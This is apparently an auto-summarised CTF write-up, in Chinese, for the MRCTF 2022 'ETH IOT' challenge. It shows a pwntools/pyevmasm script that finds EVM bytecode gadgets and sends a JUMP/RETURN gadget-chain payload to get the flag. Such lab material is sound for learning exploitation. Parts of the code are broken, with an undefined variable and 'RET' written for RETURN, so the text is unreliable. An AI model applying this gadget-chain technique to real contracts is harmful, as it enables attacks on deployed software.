---
title: MRCTF2022 后记 & ETH IOT 官方题解 By Retr_0
contest: MRCTF 2022
year: 2022
difficulty: hard
vuln_type: pwn_unknown
tags: [EVM字节码, MSTORE_RET_gadget, pyevmasm_assemble_hex, PUSH2_0x80, JUMP, EVM合约]
attack_chain:
  - 反编译 EVM 字节码找 MSTORE + JUMP + RETURN + STOP gadget
  - pyevmasm assemble_hex 编译 EVM 指令
  - PUSH2 0x01 + PUSH2 0x80 + MSTORE + PUSH2 0x20 + PUSH2 0x80 + RET STOP
  - PUSH2 JUMPGADGET + PUSH2 0x01 + PUSH2 0x80 + RET
  - 发送 INPUT YOUR JUMP 触发 EVM JUMP
  - flag 在 EVM 合约执行结果中
key_payload: 'JUMPDEST MSTORE JUMP / JUMPDEST RETURN STOP'
one_liner: MRCTF2022 EVM 字节码逆向 + JUMP/RET gadget 链。
lesson: EVM 字节码逆向关键是找 JUMPDEST + 跳转 gadget；pyevmasm 库是 EVM 编译利器。
quality: medium
---

# MRCTF2022 后记 & ETH IOT 官方题解 By Retr_0

## 来源
- 原文：ctfiot.com/37681.html
- 作者：Retr_0
- 比赛：MRCTF 2022

## EVM 字节码 gadget 链

### 关键 gadget
```asm
JUMPDEST  ; 入口
MSTORE    ; 写内存
JUMP      ; 跳转
JUMPDEST  ; 跳转目标
RETURN    ; 返回数据
STOP      ; 停止
```

### payload 构造
```python
from pwn import *
from pyevmasm import assemble_hex, disassemble_hex

MSTORE_GADGET = assemble_hex("JUMPDEST\nMSTORE\nJUMP")[2:]
RETURN_GADGET = assemble_hex("JUMPDEST\nRETURN\nSTOP")[2:]

# 在 EVM 字节码中找 gadget 位置
ms_addr = temps.find(MSTORE_GADGET)
RT_addr = temps.find(RETURN_GADGET)
RTADDRESS = RT_addr / 2
MS_ADDRESS = ms_addr / 2

# 构造 PUSH2 指令
payload = "0x0014,0x0065," + "0x" + hex(int(RTADDRESS))[2:].rjust(4,'0') + ",0x00ed,0x006d," + "0x" + hex(int(MS_ADDRESS))[2:].rjust(4,'0')
p.sendline(payload)
```

### EVM 指令序列
```asm
PUSH2 0x01
PUSH2 0x80
MSTORE
PUSH2 0x20
PUSH2 0x80
RET
STOP

PUSH2 0x20
PUSH2 0x80
PUSH2 JUMPGADGET_RET
PUSH2 0x01
PUSH2 0x80
PUSH2 RET gadget
```

## 关键技巧
- **EVM 字节码逆向**：JUMPDEST + 跳转 gadget 链
- **pyevmasm 库**：Python 编译 EVM 指令
- **MSTORE + JUMP**：写入内存后跳转到指定位置
- **RETURN**：返回执行结果

## 适用场景
- 区块链智能合约逆向
- EVM 字节码分析
- CTF 链上取证
